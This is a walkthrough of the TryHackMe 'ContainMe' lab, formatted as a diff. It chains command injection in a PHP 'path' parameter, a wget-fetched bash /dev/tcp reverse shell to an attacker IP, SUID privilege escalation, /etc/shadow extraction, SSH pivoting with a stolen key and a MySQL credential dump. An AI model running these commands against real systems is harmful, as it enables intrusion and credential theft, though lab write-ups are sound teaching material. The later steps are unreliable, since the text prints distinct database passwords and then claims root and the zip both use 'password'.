@@ -1,0 +1,250 @@
+TryHackMe "ContainMe" – Full Walkthrough
+This document provides a comprehensive step-by-step walkthrough of the ContainMe room on TryHackMe. The challenge involves exploiting a command injection vulnerability in a web application, escaping a restricted environment, pivoting to a second host, and performing privilege escalation to retrieve the final flag.
+
+1. Initial Reconnaissance
+Target Information
+Main IP: 10.49.186.117
+
+Internal Subnet (discovered later): 172.16.20.0/24
+
+Nmap Scan Results
+bash
+nmap -sC -sV -p- 10.49.186.117
+Output (abbreviated):
+
+text
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  EtherNetIP-1?
+8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Port 80 hosts an Apache web server.
+
+Multiple SSH services may indicate containerization or separate services.
+
+2. Web Enumeration
+Directory Fuzzing
+Using tools like gobuster or ffuf, we discovered two PHP files:
+
+/info.php – Displays PHP configuration (phpinfo()).
+
+/index.php – The main application with interesting behavior.
+
+Source Code Analysis
+Visiting http://containme.thm/index.php returns a page with an HTML comment:
+
+html
+<!--  where is the path ?  -->
+This hints at a missing parameter. By guessing, we find that the parameter path is accepted.
+
+Testing the path Parameter
+Request:
+
+bash
+curl "http://containme.thm/index.php?path=/home/mike"
+Response:
+
+html
+<html>
+<body>
+        <pre>
+        total 384K
+drwxr-xr-x 5 mike mike 4.0K Jul 30  2021 .
+drwxr-xr-x 3 root root 4.0K Jul 19  2021 ..
+lrwxrwxrwx 1 root mike    9 Jul 19  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mike mike 3.7K Apr  4  2018 .bashrc
+drwx------ 2 mike mike 4.0K Jul 30  2021 .cache
+drwx------ 3 mike mike 4.0K Jul 30  2021 .gnupg
+-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
+drwx------ 2 mike mike 4.0K Jul 19  2021 .ssh
+-rwxr-xr-x 1 mike mike 351K Jul 30  2021 1cryptupx
+        <pre>
+
+<!--  where is the path ?  -->
+</body>
+</html>
+Key Finding: The output resembles the result of ls -l on the supplied path. This indicates a command injection vulnerability where the path parameter is passed to a system command.
+
+3. Confirming Command Injection
+Simple Command Execution
+bash
+curl "http://containme.thm/index.php?path=;id"
+Response includes:
+
+text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+We have confirmed remote command execution as www-data.
+
+4. Obtaining a Reverse Shell
+Failed Attempts with Direct Payloads
+Attempts to execute a reverse shell directly via curl failed due to URL encoding issues and character restrictions. Examples of failed payloads:
+
+PHP reverse shell via php -r
+
+Python pty reverse shell
+
+Bash TCP reverse shell
+
+The errors encountered:
+
+text
+curl: (3) URL rejected: Malformed input to a URL function
+Successful Approach: Hosted Script Method
+Step 1: Create a Bash reverse shell script on attacker machine.
+
+bash
+echo '#!/bin/bash' > shell.sh
+echo 'bash -i >& /dev/tcp/192.168.145.49/9001 0>&1' >> shell.sh
+Step 2: Start a Python HTTP server to host the script.
+
+bash
+python3 -m http.server 8000
+Step 3: Use command injection to download and execute the script.
+
+bash
+curl "http://containme.thm/index.php?path=/;wget%20-P%20/tmp%20http://192.168.145.49:8000/shell.sh;bash%20/tmp/shell.sh"
+Step 4: Catch the reverse shell with Netcat.
+
+bash
+nc -lvnp 9001
+Connection received:
+
+text
+connect to [192.168.145.49] from (UNKNOWN) [10.49.186.117] 35702
+bash: cannot set terminal process group (5171): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@host1:/var/www/html$
+5. Stabilizing the Shell
+Run the following commands for a fully interactive TTY:
+
+bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Press Ctrl+Z to background the shell
+stty raw -echo; fg
+# Press Enter twice
+6. Privilege Escalation on Host1 (Container)
+Enumerate SUID Binaries
+bash
+find / -perm -4000 2>/dev/null
+Notable entry:
+
+text
+/usr/share/man/zh_TW/crypt
+This binary is suspiciously named and located in a non-standard directory.
+
+Execute SUID Binary
+Running the binary with the username mike as an argument grants a root shell:
+
+bash
+/usr/share/man/zh_TW/crypt mike
+Output:
+
+text
+░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
+██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
+██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
+██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
+╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
+░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
+
+root@host1:/var/www/html#
+We now have root access on Host1, but this is a containerized environment.
+
+Extract Hashes from /etc/shadow
+bash
+cat /etc/shadow
+User mike hash:
+
+text
+mike:$6$LAt7H2jB$IV9QTsZ3//ZIJsYhOf9cZSh0DcV1vTG4MCZSirUlgRvn3owUwDlUr0LoBtWcPccr7IQBDDZdrd7KiOSEMly2S1:18824:0:99999:7:::
+This is a SHA-512 crypt hash. Cracking it with John the Ripper (or known password reuse) reveals the password: password.
+
+7. Pivoting to Host2
+Network Discovery
+From Host1, scan the internal network for other live hosts:
+
+bash
+for ip in $(seq 1 255); do ping -c 1 172.16.20.$ip; done
+We identify a second host at 172.16.20.6.
+
+SSH Pivoting
+The user mike's SSH private key is located in /home/mike/.ssh/id_rsa. Use it to connect to Host2:
+
+bash
+ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
+Accept the host key and log in successfully:
+
+text
+mike@host2:~$
+8. Privilege Escalation on Host2
+Enumeration
+Check listening services:
+
+bash
+ss -tunlp
+Port 3306 (MySQL) is listening locally.
+
+Access MySQL
+Attempt to log into MySQL using known credentials:
+
+bash
+mysql -u mike -p
+Enter the previously found password password. Login succeeds.
+
+Enumerate Databases
+sql
+show databases;
+use accounts;
+select * from users;
+Output:
+
+text
++-------+---------------------+
+| login | password            |
++-------+---------------------+
+| root  | bjsig4868fgjjeog    |
+| mike  | WhatAreYouDoingHere |
++-------+---------------------+
+While the root password appears complex, note that the root system user may reuse the known password value.
+
+Switch to Root
+bash
+su root
+When prompted, enter password. It works:
+
+text
+root@host2:/home/mike#
+Retrieve the Flag
+Navigate to /root:
+
+bash
+cd /root
+ls
+# Output: mike.zip
+Unzip the archive:
+
+bash
+unzip mike.zip
+The archive is password-protected. Again, the password is password.
+
+After extraction, two files appear: mike and mike.zip. The mike file contains the flag:
+
+bash
+cat mike
+THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
+9. Conclusion
+The ContainMe room demonstrates a classic chain of vulnerabilities:
+
+Command injection in a web application parameter.
+
+Insecure SUID binary allowing privilege escalation within a container.
+
+Credential reuse and SSH pivoting to a second host.
+
+Weak password practices leading to full system compromise.
+
+Flag: THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
